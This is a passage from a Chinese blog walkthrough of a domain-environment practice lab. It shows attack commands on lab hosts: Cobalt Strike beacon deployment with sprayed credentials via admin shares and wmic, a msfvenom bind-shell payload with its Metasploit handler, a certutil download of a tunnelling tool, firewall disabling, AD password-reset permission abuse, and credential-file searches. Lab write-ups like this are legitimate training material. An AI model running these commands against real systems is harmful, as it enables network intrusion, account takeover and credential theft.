<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128100016924.png" srcset="/img/loading.gif" lazyload alt="image-20251128100016924"></p>
<h3 id="第三台主机上线CS"><a href="#第三台主机上线CS" class="headerlink" title="第三台主机上线CS"></a>第三台主机上线CS</h3><p>需求：把木马运行在第三台主机上。监听和木马都可以用同一个，端口虽然一样但是电脑不一样。</p>
<p>假设已经通过密码喷洒得到了凭证vllay&#x2F;Xyacontribution1!</p>
<ul>
<li>在192.168.10.128创建共享目录</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> C:\share</span><br></code></pre></td></tr></table></figure>

<ul>
<li>复制木马到共享目录</li>
</ul>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">shell copy C:<span class="hljs-string">\Users\Public\beacon4.exe</span> C:<span class="hljs-string">\share\</span>   (C:<span class="hljs-string">\Users\alice\Desktop)</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128153305118.png" srcset="/img/loading.gif" lazyload alt="image-20251128153305118"></p>
<ul>
<li>使用域账户 <code>XYA\vllay</code> 和密码创建访问令牌</li>
</ul>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">make_token XYA\vllay Xyacontribution1!<br>make_token 是<span class="hljs-keyword">cs</span>的内置命令，用于：在当前会话中模拟指定用户身份、避免在每条命令中重复输入凭证、对后续所有操作生效<br><br>找到密码本：<br><span class="hljs-keyword">shell</span> <span class="hljs-keyword">dir</span> \\172.16.10.129\c$<br><span class="hljs-keyword">shell</span> <span class="hljs-keyword">type</span> \\172.16.10.129\c$\xya_share\Memo.txt<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128153413932.png" srcset="/img/loading.gif" lazyload alt="image-20251128153413932"></p>
<ul>
<li>将木马程序复制到目标机器的临时目录</li>
</ul>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> C:\share\beacon4.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">172.16</span>.<span class="hljs-number">10.129</span>\<span class="hljs-keyword">c</span>$\Windows\Temp\beacon4.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>

<ul>
<li>使用WMI远程执行木马程序</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">shell wmic /node:<span class="hljs-number">172.16</span><span class="hljs-number">.10</span><span class="hljs-number">.129</span> /<span class="hljs-keyword">user</span>:XYA\vllay /<span class="hljs-keyword">password</span>:Xyacontribution1! process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;C:\Windows\Temp\beacon4.exe&quot;<br><br>在<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.128</span>会话执行：<br>命令：<span class="hljs-keyword">connect</span> ip port。<span class="hljs-keyword">connect</span> <span class="hljs-number">172.16</span><span class="hljs-number">.10</span><span class="hljs-number">.129</span> <span class="hljs-number">4434</span><br></code></pre></td></tr></table></figure>

<p>成功上线</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128162052488.png" srcset="/img/loading.gif" lazyload alt="image-20251128162052488"></p>
<h2 id="上线到MSF"><a href="#上线到MSF" class="headerlink" title="上线到MSF"></a>上线到MSF</h2><p>都是主动连接</p>
<p>需要获取一个正向的msf连接，生成一个正向tcp连接的payload文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">.\msfvenom -p windows/x64/meterpreter/bind_tcp lport=5555 -f exe -o b.exe<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128111355108.png" srcset="/img/loading.gif" lazyload alt="image-20251128111355108"></p>
<p>将木马上传</p>
<p>exe执行成功之后，192.168.111.20会开启5555端口监听，然后在msf上个运行blin_tcp模块来获取shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set rhost 192.168.111.20<br>set lport 5555<br>run<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128111421705.png" srcset="/img/loading.gif" lazyload alt="image-20251128111421705"></p>
<p>上线第二个主机，添加路由</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128111504293.png" srcset="/img/loading.gif" lazyload alt="image-20251128111504293"></p>
<p>将木马上传</p>
<p>exe执行成功之后，192.168.10.128会开启5555端口监听，然后在msf上个运行blin_tcp模块来获取shell</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128112127151.png" srcset="/img/loading.gif" lazyload alt="image-20251128112127151"></p>
<p>10.129的上线参照CS和msf就可以，一样的。</p>
<h2 id="文件上传到192-168-10-128主机方法："><a href="#文件上传到192-168-10-128主机方法：" class="headerlink" title="文件上传到192.168.10.128主机方法："></a>文件上传到192.168.10.128主机方法：</h2><p>方法一：直接通过3389复制粘贴</p>
<p>方法二：10.128可以访问到10.98，把文件上传到图片目录上去</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114163848281.png" srcset="/img/loading.gif" lazyload alt="image-20251114163848281"></p>
<p>然后10.128请求路径，即可下载</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">10.98</span><span class="hljs-regexp">/images/</span>ew_for_Win.exe<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118093151508.png" srcset="/img/loading.gif" lazyload alt="image-20251118093151508"></p>
<h2 id="在搭建代理链过程中遇到问题"><a href="#在搭建代理链过程中遇到问题" class="headerlink" title="在搭建代理链过程中遇到问题"></a>在搭建代理链过程中遇到问题</h2><p>问题一：在192.168.10.98这个主机上执行-s rcsocks -l 1080 -e 7778命令时，3389就断，最后把suo5代理换成了reGeorg，就解决了</p>
<p>换reGeorg也和suo5操作差不多</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">netstat -ano |findstr  端口<br>taskkill <span class="hljs-regexp">/t /</span>f /pid  <span class="hljs-number">111</span><br><br>python3 neoreg.py -k password -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">111.20</span>/tunnel.php -p <span class="hljs-number">6665</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118164840020.png" srcset="/img/loading.gif" lazyload alt="image-20251118164840020"></p>
<p>问题二：在搭建过程中，192.168.10.128主机上的ew一直连接不到10.98主机，ping可以ping通</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118165115015.png" srcset="/img/loading.gif" lazyload alt="image-20251118165115015"></p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>

<p>关闭10.98主机Windows 防火墙，问题解决</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118165153220.png" srcset="/img/loading.gif" lazyload alt="image-20251118165153220"></p>
<h2 id="4、权限滥用修改用户密码"><a href="#4、权限滥用修改用户密码" class="headerlink" title="4、权限滥用修改用户密码"></a>4、权限滥用修改用户密码</h2><h4 id="查看对特定用户的委派权限"><a href="#查看对特定用户的委派权限" class="headerlink" title="查看对特定用户的委派权限"></a>查看对特定用户的委派权限</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 需要安装 ActiveDirectory 模块</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory<br><br><span class="hljs-comment"># 查看对 wake 用户的有效权限</span><br>(<span class="hljs-built_in">Get-Acl</span> <span class="hljs-string">&quot;AD:\<span class="hljs-variable">$</span>(Get-ADUser wake -Properties DistinguishedName | Select-Object -ExpandProperty DistinguishedName)&quot;</span>).Access | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*alice*&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119111117851.png" srcset="/img/loading.gif" lazyload alt="image-20251119111117851"></p>
<h4 id="权限详情解析"><a href="#权限详情解析" class="headerlink" title="权限详情解析"></a>权限详情解析</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ActiveDirectoryRights</span> : ExtendedRight          ← 扩展权限<br><span class="hljs-attribute">ObjectType</span>            : <span class="hljs-number">00299570</span>-<span class="hljs-number">246</span>d-<span class="hljs-number">11</span>d0-a768-<span class="hljs-number">00</span>aa006e0529  ← 重置密码 GUID<br><span class="hljs-attribute">AccessControlType</span>     : <span class="hljs-literal">Allow</span>                  ← 允许<br><span class="hljs-attribute">IdentityReference</span>     : XYA\alice              ← 授权给 alice<br></code></pre></td></tr></table></figure>

<p><strong><code>00299570-246d-11d0-a768-00aa006e0529</code></strong> 是 Active Directory 中 <strong>“User-Force-Change-Password”（重置密码）</strong> 的标准 GUID。</p>
<h3 id="现在可以重置密码了"><a href="#现在可以重置密码了" class="headerlink" title="现在可以重置密码了"></a>现在可以重置密码了</h3><p>使用 PowerShell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 重置 wake 的密码</span><br><span class="hljs-variable">$newPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;NewP@ssw0rd2025!&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-ADAccountPassword</span> <span class="hljs-literal">-Identity</span> wake <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-NewPassword</span> <span class="hljs-variable">$newPassword</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119112218362.png" srcset="/img/loading.gif" lazyload alt="image-20251119112218362"></p>
<p>切换到 wake 域用户</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">runas</span> /user:XYA\wake powershell<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119111713111.png" srcset="/img/loading.gif" lazyload alt="image-20251119111713111"></p>
<p>搜索flag文件</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell：<span class="hljs-keyword">Get</span>-ChildItem -<span class="hljs-type">Path</span> C:\Users\ -Recurse -ErrorAction SilentlyContinue -<span class="hljs-keyword">Include</span> *pass*.txt, *pass*.xml, *pass*.ini, *cred*, *vnc*, *.config, *<span class="hljs-keyword">user</span>* -File | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> FullName, Length, LastWriteTime<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119113018338.png" srcset="/img/loading.gif" lazyload alt="image-20251119113018338"></p>
<h2 id="以Wake域用户身份上线CS"><a href="#以Wake域用户身份上线CS" class="headerlink" title="以Wake域用户身份上线CS"></a>以Wake域用户身份上线CS</h2><h4 id="以-Wake-域用户权限运行-Alice-桌面的文件"><a href="#以-Wake-域用户权限运行-Alice-桌面的文件" class="headerlink" title="以 Wake 域用户权限运行 Alice 桌面的文件"></a>以 Wake 域用户权限运行 Alice 桌面的文件</h4><p>复制文件到公共位置，这样wake才有权访问</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">runas</span> /user:XYA\wake  <span class="hljs-string">&quot;C:\Users\Public\beacon2.exe&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251120113151295.png" srcset="/img/loading.gif" lazyload alt="image-20251120113151295"></p>
<p>以wake身份上线</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251120113311294.png" srcset="/img/loading.gif" lazyload alt="image-20251120113311294"></p>
<p>我是边学边做的，有不对的地方请谅解，请指正，感谢。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="category-chain-item">靶场练习</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83/">#域环境</a>
      
        <a href="/tags/WP/">#WP</a>
      
        <a href="/tags/%E4%BB%A3%E7%90%86%E9%93%BE/">#代理链</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>靶机-No-CVE-Range系列靶场B</div>
      <div>http://example.com/2025/12/10/靶机-No-CVE-Range系列靶场B/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>manic</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年12月10日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/29/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/" title="win上配置brida插件">
                        <span class="hidden-mobile">win上配置brida插件</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"pw5wiM2PguIgoOksiuFeFaJa-gzGzoHsz","appKey":"YviqKAHsF1z7DaAKl4Ch5eSr","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://pw5wim2p.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量
        <span id="leancloud-site-pv"></span>
        次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数
        <span id="leancloud-site-uv"></span>
        人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
